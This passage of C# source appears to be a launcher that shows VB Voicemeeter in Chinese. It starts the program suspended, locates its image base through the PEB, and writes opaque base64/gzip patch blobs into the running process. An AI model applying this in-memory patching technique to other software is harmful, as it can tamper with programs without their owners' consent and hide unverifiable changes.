            + "ULKEvp9hBq4PdzgmlRJKUfSVeSk40D8EzqtSMBfMxpCTKrMi6/WBee1lcU0Khg/JanX2f21ZgOxrjDINM3GmljDX8Rc7GjyNGoIO"
            + "+dy9bdcCPra04KWC4rkUDG0w6LZRn5JSEX3/TX0Y3DeFQ20iyuJMoK8NqbihIEh2Awuc5seSmUfpQhtOuINGr3vJP2T4bPDLpMcR"
            + "KxDAqtnjJGzNpLTYPoQt7KOkdlxnIxl4aOVKxMfX6xx1DYviRNe8PE54L+fFif4eFW/MUkWcaL2pjhN+SzMl3J+33gw6tFHCbwk6"
            + "7Csxod2fBx0u+mk7H3QE6ae2P+i4QD+dF4OOS/Szaz7omKKf/T1Bxxz9dC0FHcxT+AmTJNFPmKKQRbAg6/rmTXbf+cETgI2SrWEx"
            + "HelmABFBt29CZ+7s67ngNULVIDmrYTHxYTQUz965+HgfET1MEpMM8RqNP3aeJuoThLeC8vxDI1ad2ebxzRJ+YjoWBjBj0vVq9X1D"
            + "8w533JSCiFMZRm8JfWoImXqoGMoCW3iknMq8xlaN/7Kph3phnPa1ELN16XeJrTkdCyp4QAdQtj0dCx241+fzGkFMrETSMUY8O6jn"
            + "wVH9X9rOE5FiFaYj5Tqvt55tOalahelIwwaWUr2KV1Xg8KlfhQYNP7mtlrPxMwl8aF6FG08IBDrnIpKfEQyQw25ipRKJREn88Z6m"
            + "OExxs3wJldESNs0mrub5Bvi3nExag2FnVBceIYO8FvIP4CJZg5kOMbG78rflxUkYXEFJhzXkJNKSmjgJ0kZCZpK0PGseV7Kxyq3x"
            + "nR9qGfzeawT/niHrZvT5XN5zXv1fR2afSY+swcLjvmSYyc+otmfgAoKHMHsJ2xkOObvHtZcB+gwsYP0/Ec9IwBlTGTg50s9KMpi1"
            + "cTJ3Y0YSj8yRZLA8cqMkQ7IWoY362Dfvv943Eeoms6iI5Km4JPBJoNt/vaszMAkBOs+cA536tQh/VMcx3dnf9o3/Zn8HZ0OzFk9D"
            + "vvUogETqu13qsML8KC1cj2naFjp/Sa/xeeMZqSaCx6iA3V7GCoWN8VH+605TXODLQkF0MhgVMPRdcs4qZAiI32lYGmoJXlPJMEEA"
            + "+CjkahnuT1wLvrP1MkxqT79hhlQBV8vgYmF2MnMvw0glrNdSzn3LyLeax6/h8euycSVz5OTb3GL6uoHS2TKObqK6SDfTbxnoajgb"
            + "OeRbm41VS0E+0+Q4fNeL+cUsNARNcozFMj9ideusl9aTgj2xkZZzclK6W3VThTkYmt04EoTKkRX9W5ODZxeeOoukPpDRxq7GHFwv"
            + "9zA5dJEJYpgs8xeF+Tu1OWh5JHTuPClzLS4+GfJF+KRxei4H9yUlB8LG6aRcZECP9czAV76hZ1gew3ZWp3kmnIsWoDkMnuqbmKCk"
            + "WW/uBZJRUGnE+r/diwZnUpzUmUdOsJSEkxuUJZSE/gHIPAWuYzDsmgQScl+BVRqorqvGcS9UaTUd1GczLAH/D88i7IMmj0H7HEpY"
            + "Ea6j2P4cFrLW7z1jdOu2f9JzgZ7N6zfRc4ekimITjc9obwmZ2M7TSpWA0R5WqjfRVCYMgJvosKLCgnKxsuEWQXuYE2g2YSUr2rZl"
            + "GwtSqDZwvmzCtBh0+C1+A/v883OU3rSJ7RsEVtJmpHEY7AnRZvQyFA51523GPECR+5IL976yfDMexl4j7Bc1TwMGA/rK+s1Yvbhh"
            + "hhkYxorAJeLkZvQeZeYOayBm1kUtYfbGJoxQ30yjeO/wG6Y241plsuTegkqZDS8g+uAtzD/xAqIPe9ce8XmU7OBFX1BkONk+Lk7M"
            + "u0WkizgmnbPOM36nKA+P9VtFbYvnznstoqJfvbm3ulKsysOsiIUKRU69hTbXZxxLdVto2+z1j0FTZt/CtY7tYd2wi6r5hzpP+7Zg"
            + "RK9sUbGt/Z2jyggVhWa7Zqe2IAKkNRwzdcABZp7pmk0suANzTQE3yLIgKeDODddk16yykFJds7gO5QXosd0YNLLbVCy4pdxXgLUD"
            + "jn3lYfqNftTTkVwb0ViAXsJtI+Tu6lQ2U82eTt0VpbYgdlKRGV10DpDE5ggXYOHRt1quuad1V9rHdFem6CDiPxyuiVux7sB1kpzS"
            + "61mOLWa34oHibg90m3q2qdAYvy7lbcUlFMppD1GxleJELhTuJdsX2htune/Huq3oCBQN6BxcwyFb41ZcJs/JUDvoRl7CQLm6bllI"
            + "KsRt2DWru+JuNVz2WFTbUAHyi4XcnPglKgD03YvQA8/9khYGyGFCJm7HKeG8hOsosNK2YwcV+GEoSA6K9gWrH7j12xEDqHBoOFNV"
            + "faCKbNcmaqC65h15NDbN9tgttH+ofzaKM9w3qSQUdgc7xrwzPEn5y2h+14uZ+b95q/ogXhzPXwp1z72MXSUUrlaNW+ectZ1pdRF/"
            + "JFnZe9j9h9gi3GBweHo0Jrvpa6WkCBcYbu2QZOzqjGplIZ9Hjj/SsSgrihAo37c9Y+y2DSXKmiKMA/czl50NRVx2opFwEZYrmIrd"
            + "UVLGegxWJ3F8qojb0P7T0ECllaCZ3VuK2BGN1Q81ramEHibGgc+UpPpp+GTnaZEqmVlJ5j1Y/Wbl/srKw5W1bPS6Ei3RKhVis62Y"
            + "5J33B/vVaFxmFfrHhmaxx3sFKxUgBVudLB1XUOtfweHYo0KuQcnQXTLfCO+OBQTjoVOG1mNuN/VP4zeBKLEcc7h/PuC7VdNciYkC"
            + "5yqv3/NV0vt22HkdBviXescnKnEmUGR5gTJ7kpknb2ezop7PXINeS6hbLNpDXSS3R75GHmVDqeKzy/fQvUI6HH2/6S8NhHyCBBJs"
            + "Pct3hhXlS/EOINbS+W9XgGBRI7wH0wvecLgecWoPxgyXAtJmcHxlUhXqwcbl9ERVeKbAPsTVEIXCPge9LYhVVegnrJTHd36gogoB"
            + "6zxtWQBXgv0+X10VVgdg0b4F9mZjFXcZ8J52W0PDnX3WRQ1l9c+1ajxWn7fjm+5xVxW2PdRBsMWS86D24Iu/OXz44IFDU1W4nXjS"
            + "ssO1lb/aT1DfVV352zQ1QoYCRZ2CDc74x23h4Wk2P0uVlQ+XJTW22agg3ci2ej1Wt802f27MORvTqVDjHHRucvpk4p4aOW2xOOGe"
            + "WK/GhAex81L/omDl20/ZLhKVZmqh3d8RgCbeegPXDLau6Rtnh9h1B7EsLp66XbxainsaxWnV+JgDYvYXh2v3/cNWqWT9VqmU/MqE"
            + "8xT+bU3elHV/U5M/u6YaU7fzu44vwDEYISYR26uxMA5+SVq+VsMA4M5K2Lde3HMoUo37LziquzIwZjdDMmh/CC0MfOW2Mb/GHU8X"
            + "EwTQ6RlabFpmr+CaRPctpiW7l9s5gVFSIGibB8u6Fy1h/2f/n+H2mKB8L95e4M0OZoXHGav7J7jCw9V8L+4FeBuCu69WP6KFzN+H"
            + "OcSfHNoP0lC1ej8lVU1cuA/rUXS7gfshH7Ss+zDS3klo9/nSlpM+OgRg8ThHAnj6Dvy0Wjp3Z75MtR/DfHlDad/84LWYet0d2TLf"
            + "/theZW8dMnd3mSzvAO5S1qb3X48NKD+AZw2fJ2uivFb7SCSmp72dJ2t4mx7WUDSQ1RRn0E2meTvWPoIr5re5WhvqDvX2XADWBNVw"
            + "ndF3wgVijlqAT2ohsTZ2uQD1tFq0AGTUQl5tzAIUNFUtWoBPaqGiNna1AfWa2ljTErXQWIsHE5RHOPTfRQW5PEu6t/AI+x48BVOW"
            + "QpEli7Im3kU8pLk5WfIob+5dnDqjOjbuKCrFugR4I5k6iosK3X20OYfDMfF9TA1gw3kfa+wb6/Gxw7BEOwEpG/rcM2bqua0UxVuK"
            + "lpP2evreT854aEShQh2jz44kQnhQ1h7D1IV3dGPA2A/v/dGzIXwM92J0elBpPzUChXDuWLzjgNYBWP+azLCk47jaO6n3BnvgFAv5"
            + "TD2w9QKTsOu6jB2BlpOS36E/sOG4ga7fcYkSPWTKP0BU+BFBZZj4ADc6aZ8ke9juyXPTsL9gnzG/R5PQswELXv8/xBCBghCTPkQ8"
            + "4YnWqO0ctUegA4DS8SEWAaOxQwN8jps0nQLdlUwiV7BD8zpbE6WlG7NzkGavU1oikyOtITSZTPEsFUt+QjI3h442c6SEKufNIJkj"
            + "lyDpouTGXDpWNUtJUnmBDBOS4C9XSIASSSX7D+XJFSShxBVzKbC15XIpT0KTVMzMC/1vmBf6n7Qg9L9pQeAwuyhwWLMocFhyQ+Cw"
            + "+YbA4byluznsWkJFOeeT6ubd/Q/fpKpSOkXF/yGZraD+THDkRjpjDTEDpIy6N0dJmYJOU59AyY3UVOLfUZILvJGS0mepqbS/p2QO"
            + "NdXMkTJqKu+eVAGqLkrHUFXdmypANXxvKh/VivtS+ahOUDKKas39qXxU5ziSQ7U+MfUuqCY+kMpHtZGQd0M17cFUPqrNlIyiKnoo"
            + "lY+q9iEBqoplAlTtywSoFj4sQNX3sADV8kcEqEYeEaBas1yI2txyAWr1SQLUElcIUGtcIUAt7VEBas2P3g01UbIANW3y3VFTpAhQ"
            + "s6cIUCtMFaDmSxWgVv6YALXIYwLU1I8LUJt6XIBaXZoANeZnAtQaCEnOKK7gJD2BVA41pH1CiKjiSQGi9icFiBauFCDqWylAtPwp"
            + "AaKRp+6GqPppAaJTT98d0bqfCxBlWAGiDawA0aR0AaJN6QJE2VUCRDWrBIhKVgsQNa8WIJq3RoCoaw0fUVUGH9GKtalw7sBLCFzu"
            + "4C5Kn24miOARKnCPDLVQpmr9LXVgvbBuVGQinS3JpX5NUFou4eauyUKaYM5VNErnSOXUXv0GnDRXmqNAcD1O64yYlSCToIi87DoS"
            + "l1hDmbmcYnYdAUoskQrdMxN6OS1jnBaZWZwnu6XYETqJOh2dgBgQq7KFvoezhb5XyHEY+B51gVgUT8iFIQCq4pqNOFYRXa85Qj9I"
            + "HaXG6nNS4RCXysjyc9ZgYnFiLlWUZ3OVuJFj5ESTSqJIjTaFcKdTKZGET+hspghJ+rL2C/ar8ILWfaPr+6zG51AFXpbcAY81bROS"
            + "cE0hd0Vps4CUiTbzyWytgJSX50J7lZDBSBgZU006pEzye+TIB02240250NDcIlLuPrgn5XlogBLUOyYaWUbErGOyyK+YKXwenk4T"
            + "vigpf7Xs9aJSlilitjFbyC/LsHvu+ecsBn7yXoArTEJz6b98dGeF5q23WNnFvMjkM8VEqejjA+9TpcaXeFbupHBj+x1dZF/GkKLG"
            + "L1eOvE71IyXQ5CVAhJFKiLRGBTfdhEjl8L6yN5jX//hR5Q7b8fv/UUkUMphDTEQFl7eEfKaMuF/CABvE66o27NSUpu3AEP79DZaJ"
            + "KrAMWLivtOjjvx59orGsUcnUECURk7BsZ+VeGP174ulzxTOV//0f4K+CcEDtn/7t4ht//Ghhh5iJ7LjFnwWBP6LSZGYNTPlcRedR"
            + "Og1MLmWELizsUDLqUrhaJQy9s34nTD7z2sWPlEwzZYIGjMgg661kfKUICjBVfyp4TckwZYjqLqJBLVLv08rgDToho3iTWkQ/g1V/"
            + "2KkoQ5NFZJULiGry+3oyeXkZppuICf/51HFwXorZJSdr01SGaxMXbSRCGRGYy6CZT9hO4oiaCZehZwAXZTA70bN4rJRduBOXCWDk"
            + "A/Hue8d3k5h3ooN/+s8HCPK9H+eqPzxELNMRu0leFnGr9l1tRVn6r5e/Tnx6BadNfd37FmX43oJLRQJsCtgxsBbRzTJeVv6qsphm"
            + "V1IlvMtguoIqXy2z+IN3YGhjJc67rgqUFotfKfmwcqaYZdLxR4UXzwTNm6pX/1zufsd3KJbFkCS249GsZw6jAEwIBep3OetH35CU"
            + "8pGAHBK9h/g+0PjtG9E0Z47Cf1mQbHv7vzSloqMYdf+RspKpctAoxGshj8FiwkTqBZsrPnvaMQQa3Ioz847FMAHmO6/ZjiuLYffE"
            + "Vf4fuPTE7qwmAAA=";
        internal static readonly string GZ_VM_X86 =
            "H4sIAAAAAAAC/31ZD1STV5b/OMedsbvujjMDu+ysu/t1KtvEVZogYprpmQMdO4tnFKlQpdWtTAsVWqyuMh1qbYc6zA6ie8Qto3Ta"
            + "MyvK1Iio+fMlBPOXEEJISAhJCCljlVJEKmqxUP4oePbd+778+VBba893/7x77/u9e++7L92wKZFZwjDeK2xW3vpNbOe87uJ2wloq"
            + "ZHG3vBOVhP1vDLMC/2G9dpXZcElzzT7AjagN/V+wopTSp1JKxVS8YnleIvPXxIbdeN/fy40EB4oIYzHDaI2aKTBmj5GeG5ouHyF/"
            + "yDABtfF+SO91+HtVp7kRTVfrJ4/PEMnfMAxwvRxwU3Pz+aXOMbCkzOc30KIwBoJh8LjuBdwArFEbXJOBAc6t6fZ9XUbY/ypkB9oN"
            + "Z1b1n1J/HnD1DKsNffPOlqVbE5m/YxjfLUtXqNHYaLhtaXIZM7eiE8+M7XpbsykArKKtGHLffHCg5ZTb4+wJNXaOdU6kpqYeIZLv"
            + "UQn3ifWWIaznCPck4f4DjdN0LtTo+pIbcY6Ba9UtIg1Sry33vXcc07ACtnaTMJMZpnPMeFP9pf2u1h5wGe9f8vTcDHxiGzN8/UxB"
            + "IpPIMFtL3yza/et9LAQHq+RsSmljAZoLDvRcBZNqg6Ur0D5ZgGcS29nSFxOZRQwDn8tepCj6tXbPjPZGn9twRkJZIPUPeYbA9IYX"
            + "EXrYK5Afv0gPmevza02wpcUv4RL41N9xmUCn4iWMhG7UxznHXGeUl8MvYeTO675RV0h3EVzQqE43zxHRE7BnbafNGAlFa/8xREZ1"
            + "fuzXtI8QyFZuS2T+hWEMd5wNgA047Q+13OMuqE/1abpntaYeW4tpzzYMUevk5gksbPtY5TbcQlfw0gTEVE/I7zCMKxhoD/maCfEY"
            + "jRXyQW4l9HcZpnuyz2Qbk/soRdGXD9KF/l4I/uY2zAU9F3JQZVZknOyeVV4TL9mO24dkNTrcXxjuQvaJIkzNVIyZTZgr4g87snm6"
            + "a9h0yOfqbLkT8LGbn/uP53KObMet9QRdZhrTye2Ivv++Ogzha8OhFo6yeBMY65L/xIKCTbJPsch5OZH5AT1ozSlXkPO65v29muae"
            + "K5UvI1YggFMT7YiSUJp7dkTrEEpYUoikckRlJhm4b+WriI+v0zHg7EuPEW2zmTHCey07Rrjt+XFr5gtjhO5+SYzwG05SwnVBdz9o"
            + "a44QfkPQpn8VE9p1IWiz0k9zR9DWTT+V7qAtSD8dV4O2y/SzbTZoG6WfbnvQNk4/nfNB2wz9BCeLivATXCzeiWBB1nXNaq2+jp5T"
            + "gI2clezEdKTFACKCbteoSm/psl/2ctA1SM4W7cTEh9XQPDtnYuuriehvSWKSJV6O+9rSBD2D8L5Pef7efqNKb/b4pgnfuhMbA5jR"
            + "qjqV6q7eWZsrZmqciJMYRm0IndGEtHYqhrbAZu9fWoIyL6dT+K9p7TQKbsLXABVV8oi95ZZgQ4UI6ALKLivBRgfhdfm8HIih/ZXg"
            + "HvHuoJEHB9R/bukgosESTEfKdUzqLjacnizBdKTbBpZ8cWlcV4HLZ1kpGtR84zIaLsbuJIhBVoqFJwQCg9tOJP9IMEAO+wwrlUgk"
            + "chKPt4niUMl7uQKd0RDWTteXxsUG+Dectr+O204pzd5PFnkN5D+Ay/DrmOmwJ3ZL1vrJGAmLE99A0mYMOYh00/IYCVIZIVeRtLyo"
            + "H5Gz0c6t8HX0NvTc9nIQ35Pk3Difz+m95FV/2j/95ONVb2DjcQ1rprJSSreX4QFChOB9E2sJhxztI8prBN+KMmxg7m9IZGTDKVVl"
            + "6BzppyUptXHk2jUpH8eRGZIURRy5RpLClSG0kRi7Zv2TXaOhduLFRyT/HJMEPgm0+yfbLIEx2KDj3CXQYXYh/BEd24TF3XLdf99t"
            + "4m0s34W3Ybz1CIBEmv2g1GYE/ygt34tp2hLqGFYrfN5YRtYRwd9TAfuLPFYo1MdW+Scd2phguBwFEWewKqDpGnZML69AQPwOzXxv"
            + "Q/COrAITBICPQL6hAusTzyI+2MIKTGqPWzNFuoCzoede8tuJzF8xjFTCeg3L+e808i2J48vi+Jlv40lmpJNvfYP2i1xKr07j6UKq"
            + "i3QJ/U4D3T28jQzyXfE2di0Z+Ryky7c8m5XDwkBQuB/3YpjtN7pUxuGVpGHXvkPbObkpXTrV+M13cGtWrj8InSM18u+SA3h34a1z"
            + "j/QHspprEx3A83L1kUsXmSAGZ6t+lp2Vv+4AWu4PXeqQs76Ggngy5CuLJ7mJygNYl5TsDnMTdZQBM9aT3Z/7ep9sjGOYL6oUT+a+"
            + "ixZgOAw2do0WUlKv1ncCWc5LB43n2+9pHJUxUqXvP1XLK5ObG5Q/piTMD0A2v4vnGAw7x4AkuWd8F7s0UG23uBEvdGkfXdRl1swD"
            + "f/Q9hL1H69EMVmLn0t32DNFabf3Efplextnv04uG5Ebu+3RDnLUhpGUtTfIiAaM1LK94n+YuYQC+RIcVZT9XIJbXLRC0hnkB9z62"
            + "ro3r161nQQrthYQ6+T7mQY/Nb/Br2J/+dNFBpJ95hu3qAdYySuMyKIL0gxhlKBxqzz2IB48i17ATi11echBvXy8HBVIRpwGLAW75"
            + "kYPYrvhlmilYxoogJLFceRCjR5neZAxEzfqoJUzXqMNhGpt2AB8afs3kQTycVSx5qKDSqqIqPAiIFvxzVYg+FKt10OeRsz1XfUGR"
            + "5nTriDi4UKQatI05ph3n/I7xKrzHF4pa7l3q8BpEG3/56hulxeLk32EaRLcKXW24mk7T52zzc9V0Tvb6h2AKW3eInxVbw6q+DYfo"
            + "LNFraco/hDt6YV0uq3NbBuSFVBSabpsuP4QIkFlwSGuCG0s/1TZd/TBmc2SR4a7xEH9ROMfapuU+SrVN4zkMHsKIrVyQY9fnshCW"
            + "fPIQNgu45+Vz9BvjWFSDK/m5YVkNRgnPi5CrzSJfWYOadovqhnxdTfRqIh4La9AHSKI+9tRgp1HrDHdcE6obrUOqG9V0EYkfbtOP"
            + "a7DRwPuRXMsrWZ4t5mrwBnG1Btq19vW5aCy+EQVr8AiFcjo0jNdQnMgLwjVv/kw551L5vl50GAOBLgGjgrMvZE4+jMfkOR1qBd3t"
            + "R3CjfCM33K06gmXYNq264dJprnkMxv9BBcgvFnJTdhQVAPr2ezD0Zh+lnQBymJD5R9ElXJDw/gRW0VEcmQJf9QbJzdB61+gHrv0o"
            + "YgAtDQ2vyi19cycp1zA1ULrnrfTI3kaPRp+d7l73dARnoryoFiWhsCtoGvJOxUmO1KL5Lc+uyvpVUelufCl2DIfalx/DMRI6lU7h"
            + "Ujmmzed0ThKPJHX1a+yufdnHsMDgtvQotFbtF/KCY3jA8EyHJGOfSCmVl8XzyH1HRhR51TEEyvelfYhd/9Qmed0x3AfWM5+dimN8"
            + "dqKR8WPYrsAV+/ymPNajMTpI4Iv/ly9ofxNMTKIP0MzWdRvZfoXRDz1N8QG9PbjuZjnpflw8aWlaV4cbX59Dksr7lfVWJGhFHTpn"
            + "Q9NwVMyH2IYABqhjci58t2Q/xOU4cUIiQT9QDevnyj6KRgvrYe6FQeLIR9S5wq8FUf1HmKDu2YBvoWalArMAbsm46a1eQV/PYcck"
            + "LPDPd44oFegJFNktu0tfLd5VXFxevNdO2P/0IJsV2ZudPV5DqF08ShfCWzBeY46yoQ/FsxPP0kIg84rarf1zJiF/RDYS1F2MD4YV"
            + "ZUlxoheXnEX/DyrAZlGj9izmDvwiw098jWdxzzDik6GB58utVA+qktcLnsULA4oMT0MUCvtsdPYXz9A44aQ8vo7uRU0ImKXJcBdC"
            + "Cbp9vmVNWPrAolMIFJ6kiR/tvU0uY6jP0mW8l01Z7hmdwmP0eU3X20eKmnCIoQGCLZY0+727n/1VefnuN/cdacJaiZPmle8t/uUu"
            + "gvqW0uJfc00IGQpkFTI2OOUfMYf7Jtis1NzULNhWEw7NqCBdw+q8HqPLbJ69NOSYjurMUB/UN7laVmHB9DcZDA549SWeS2SWUbFj"
            + "2H1PcPKtjearRCX9HFpo9ZsCMJIb5/DMoC611x0m8faHiNNi4qoHxU9IsWBR3HwOf5oBMfuz8r1l//5zqWTlz6VS8jdN6Cf87Zpx"
            + "Lhc1f5tmvHdJM6au5abpMwgMVojhqdCMXa/nChngdJpuwJ2VsEXPvravqBnrLzigutE9ZNVDMii/Ct3t/txlrmrGiqeHCQKY2zQN"
            + "ZuWB84JHD61bTMv683zlBAZIg6AzHGErz6MlHO6sZ/tao4Lu8/gWgV/gwCv81GJ0fQMPciIcPY+1AL/0wEtWqe5XEm71BcyheOcw"
            + "W5BpSec9Q24JseIC9qNIuUH4IR9ZaL+AO+0cg+E9XtpwevlFXAKweBz9Abxau795Qpr9cH5a3UXc5oanNnfN9tyJqnMPZacxymit"
            + "sguXiB4tS9ujxCplzWr/ZHRBtRIvknhemp3ydNb+waje5Qd5afkaehND00BWYYxBi2yPJjobQiiVGr7XhtpDnfbLwFJQDec5tQWe"
            + "Axy1AJ/Ugl0TfSqAepBaADJiYS5mARraYg4twCe1kMxFHyqgLuKiE0nEQjaHFxO0R7j+TKiQnp4qfSN7P3uAjD/JlCWTpaZFWCIT"
            + "4iFdm5GaHuHJTOg6pTTCGLWgUnQEgF885ix4qDC6RyZvuBwTrZgawIbLPDq1V7bhTxeaeXrNS9nQBc+Q1v5AK4rNCw2nlW3013ty"
            + "gcOUSfZUZaM/IpIdws/DtTZMXfhVnAtwbvj1PnI3cDasxYh7UGlt7IdGGLTFxgmYC+AN1p7IsGScuNU5pvYG7XCLhXxaO5ReYAyq"
            + "ro0zBRpOL7JjPFBw/MJaO58okUuG7UBU4ncEnaGxAwudzEaS19j2sUsTUF9QZ8YONAkDGbDgpuvELQIFW+Q6EU/4wZVTWgasgzAB"
            + "wHDXiU2A40wK4Ee4zUkwOqVJ0mVs76zKXHgeaema1RlIj/K0hDz3gd5zIQmcyZ6m4hlKrs2gqysvUlJClRcrkcxIlyBZS8k1a+na"
            + "ZBUlSecF8iQhCf7pMglQIqlk177MdBlJKLFInQSlnZ4ujZPQJBUr1cL4ZRph/FaNMP5sThCwjxMEXKAVBDyoFQRcohMEPK57VMAV"
            + "LaiYzsfE6B8df7Weqkqpi6WtSK6W0XjqeXIN9cheomQaDU9ByTQZdSMxUHINNaXnSX7jmUYkpU9TU06ezKCmck2UTKOmwqYFWWFe"
            + "kBXmBVlhEaA6YxGgWmkVoLq4TYBqbZsA1WTbo1A9aROgKmr/lqxoF6AqswtQtdoFqGZ3CFD1dQhQLXAIUB10CFAt6RSgOt4pQLXC"
            + "KUCV6RKiVt0lQG2pS4BavUuAGusWoKZwC1CTdD8KNX23ALVMz6NRc3oEqOV6BaiFvQLUCnsEqI32CFDb4xOgNuMToFbZK0BtsV+A"
            + "Wq1fgFpyIAnuKL7hnKRUBjUkCgoRVQYFiMr6BIha+wSIZocEiPpCAkQL+h+F6GC/ANGS8KMRHQ8LEK34VIAoMyBAtHpAgOjSvwgQ"
            + "rf+LAFH2sgBRxWUBopLPBIjqPxMgmnklHlHnlXhEw1eT4N6BnzngcQdvUfq7TOFgEsxQIHD19zZQpvKaEH/ZiLBvWCm9WrKWL7Xr"
            + "SKdLeN8+ShPMaaAFo0hnSNOpvcFRdLpWmiFDcD0O45S45EtkEhSRt7qC7Es8TplrecXVFQQoccUNYXjMWBJcgdDGeC3iWVw9Jgx6"
            + "6c0kuJEh6IgDYkBcf1MYO3tLGLviFi6D2CMhEItiyW3hFgBVsf42rpVFzivzqySYCsAPNeYkjO/DiZHj562BY3HuOFVMX8134jDP"
            + "yIgkVeGdpMhQCG+6ygkk4RMmm8WTSTCXtV623oKfx9rn2m6n1k6iCvxs5Ap4jMnfIAnPFPJWlJ4UkGmiqXhytVJApl8+AONVQgoj"
            + "YdKYUjIhrSJ/9++vqjcfTn4XBpoFIvnW3a8l/hYGoISS50drWUbErGBSyV8xk/lb+F004bNNBdvydmzczDIbmfXMOvKXZdjXFm1P"
            + "ZeDP8ip4wiSc3Pzu0YcriA4vsLKFeZbJYnKI0sZjb/6GKi05EmflYQqy2oeGWFCLW4oYv1bcv4PqD38AQ14C7HCwGHZaWAcv3YTB"
            + "4r6yvFeYHR8cLX7efPi7L8qJQgqzj+mug8dbQhaTR8LfxAAbxCt2PpWv2Mz8AbdQ8wrLRBRYBix8Z/PGY5++96PavFo5k02UREzC"
            + "kvziN2D170ikP8mZKv6/OohXRjig9tJ/X33lg6N3nxcz+j8siOeuIJ45Il4OLn9SaHmPugHnUkYYwt3n5YzsODytEnrfWpkPzqde"
            + "vnpUzpRRJmjAihRy3nKm7jiCAszc48+9LGesxxHVLUSDWqTRh4/DD8wJKTnPlIzSz+DOI/mT1ORGcsrPEdUf/kZNnCeewHQTMeE/"
            + "NR6G4KWYXenkbPJP4NnERGuIMI0Iyk/AMJ/wC7KPiJnaExgZwEUZ3AmMLLZXyp45gccEMMYD8c6Bw1vlzIZ6DPD4h48R5DuPrS35"
            + "/T45U1WPK7aSvNzIn9rNvYV5j7/+vR1yxlmPbpN2eIsoQ3EGHhUJUBRQMXAWkWIZySvYJs/hs+sM/C6D6Qqq8WqrcqregqUFCvS7"
            + "Yico3ct5YdPvi6dyWOZx/MPiszFB8Wrutj8VuN4q10azGJLEfDiS9Y1UACaEAs7IW3/vFcnmeCQghwrxxZjwWO2Xr0TSfJkF/n8E"
            + "ybb/+qNic6YFd+3en7dpvAA0tuOzMI7BYsJ0twmKK+adsSHQEFaMKbJFMQHmWy+bD8tzoHpiKv8Pv9BZ43omAAA=";
        internal const int POTATO_X64_COUNT = 1043;
        internal const int POTATO_X86_COUNT = 983;
        internal const int BANANA_X64_COUNT = 674;
        internal const int BANANA_X86_COUNT = 671;
        internal const int VM_X64_COUNT = 492;
        internal const int VM_X86_COUNT = 490;


        [STAThread]
        static int Main(string[] args)
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            InitTargets();

            bool autoStart = false;
            string exeArg = null;
            foreach (string raw in args)
            {
                string a = (raw == null) ? "" : raw.Trim();
                string al = a.ToLowerInvariant();
                if (al == "--autostart" || al == "/autostart" || al == "autostart") { autoStart = true; continue; }
                if (al == "--settings" || al == "/settings" || al == "settings") { SettingsForm.ShowSettings(); return 0; }
                if (al == "--license" || al == "-license" || al == "/license" || al == "license") { LicenseForm.ShowLicense(); return 0; }
                if (a.Length > 0) exeArg = a;
            }

            AppSettings.Load();
            AppSettings.SyncAutoStart();

            string key = AppSettings.Target;
            if (exeArg != null)
            {
                string g = AppSettings.KeyOfFile(exeArg);
                if (g != null) key = g;
            }
            if (key == null || !Targets.ContainsKey(key)) key = "potato_x64";
            TargetInfo ti = Targets[key];

            // 启动画面（开机自启时跳过）
            int sec = autoStart ? 0 : AppSettings.SplashSeconds;
            if (sec > 0)
            {
                if (SplashForm.ShowSplash(sec * 1000, ti))
                {
                    LicenseForm.ShowLicense();
                    return 0;
                }
                AppSettings.Load();
                key = AppSettings.Target;
                if (key == null || !Targets.ContainsKey(key)) key = "potato_x64";
                ti = Targets[key];
            }

            string exePath = (exeArg != null && File.Exists(exeArg)) ? exeArg : FindTarget(key);
            if (exePath == null || !File.Exists(exePath))
            {
                string def = Path.Combine(@"C:\Program Files (x86)\VB\Voicemeeter", ti.FileName);
                MessageBox.Show("未找到 " + ti.FileName + "。\n\n默认路径：\n" + def +
                    "\n\n请安装对应版本的 Voicemeeter，或在「设置」中改选本机已安装的版本。",
                    "Voicemeeter 中文启动器", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return 2;
            }

            // 已在运行则询问
            var running = Process.GetProcessesByName(Path.GetFileNameWithoutExtension(exePath));
            if (running.Length > 0)
            {
                var r = MessageBox.Show("Voicemeeter 正在运行。\n\n需要先关闭它，才能以中文界面重新启动。\n是否立即关闭并重启？",
                    "Voicemeeter 中文启动器", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
                if (r != DialogResult.Yes) return 0;
                foreach (var p in running) { try { p.Kill(); p.WaitForExit(3000); } catch { } }
                System.Threading.Thread.Sleep(800);
            }

            STARTUPINFO si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(typeof(STARTUPINFO));
            PROCESS_INFORMATION pi;
            string wd = Path.GetDirectoryName(exePath);
            if (!CreateProcess(exePath, null, IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED,
                    IntPtr.Zero, wd, ref si, out pi))
            {
                MessageBox.Show("启动失败，错误码：" + Marshal.GetLastWin32Error(), "Voicemeeter 中文启动器",
                    MessageBoxButtons.OK, MessageBoxIcon.Error);
                return 3;
            }

            byte[] blob = BlobOf(key);
            bool patched = false;
            try { patched = (blob != null) && ApplyPatches(pi.hProcess, blob); }
            catch { patched = false; }

            ResumeThread(pi.hThread);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);

            if (!patched)
                MessageBox.Show("界面汉化补丁未能应用，程序已按原版（英文）启动。\n\n目标程序：" + ti.FileName,
                    "Voicemeeter 中文启动器", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            return 0;
        }

        internal static string FindTarget(string key)
        {
            TargetInfo ti;
            if (!Targets.TryGetValue(key, out ti)) return null;
            string[] cands = {
                Path.Combine(@"C:\Program Files (x86)\VB\Voicemeeter", ti.FileName),
                Path.Combine(@"C:\Program Files\VB\Voicemeeter", ti.FileName),
                Path.Combine(Path.GetDirectoryName(Application.ExecutablePath), ti.FileName)
            };
            foreach (string c in cands) if (File.Exists(c)) return c;
            return null;
        }

        internal static bool ApplyPatches(IntPtr hProc, byte[] blob)
        {
            PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
            int ret;
            if (NtQueryInformationProcess(hProc, 0, ref pbi, Marshal.SizeOf(typeof(PROCESS_BASIC_INFORMATION)), out ret) != 0)
                return false;
            byte[] buf = new byte[8]; IntPtr got;
            if (!ReadProcessMemory(hProc, (IntPtr)((long)pbi.PebBaseAddress + 0x10), buf, (IntPtr)8, out got))
                return false;
            long imageBase = BitConverter.ToInt64(buf, 0);
            if (imageBase == 0) return false;

            if (blob == null || blob.Length < 8) return false;
            int pos = 0, ok = 0, total = 0;
